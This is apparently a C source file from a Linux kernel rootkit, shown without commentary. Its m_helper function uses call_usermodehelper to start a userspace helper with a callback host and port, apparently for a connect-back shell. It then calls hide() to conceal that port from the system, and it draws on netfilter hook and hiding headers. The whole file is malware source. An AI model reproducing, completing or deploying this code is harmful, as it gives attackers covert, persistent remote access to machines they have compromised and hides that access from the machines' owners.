#include <linux/kmod.h>
#include <linux/types.h>
#include <linux/string.h>

/* src/include */
#include "debug.h"
#include "config.h"

/* logic */
#include "hide.h"

/* net/include */
#include "cb_arg.h"

/* net */
#include "nf_hook.h"
#include "m_helper.h"

/**
 *
 *
 */
static char *_argv[] = {
        SHINI_HELPER,
        NULL,
        NULL
};

/**
 *
 *
 */
static char *_envp[] = {
        "HOME=/\0",
        "TERM=linux\0",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin\0",
        NULL
};

void m_helper(void)
{
        char *endp;
        unsigned short dest;

        _argv[1]  = cb_arg.host;
        _argv[2]  = cb_arg.port;
        dest      = simple_strtol(cb_arg.port, &endp, 10);

        if (call_usermodehelper(_argv[0], _argv, _envp, UMH_WAIT_EXEC) >= 0)
                hide(dest, LIST_HT4_PORT_D);
}

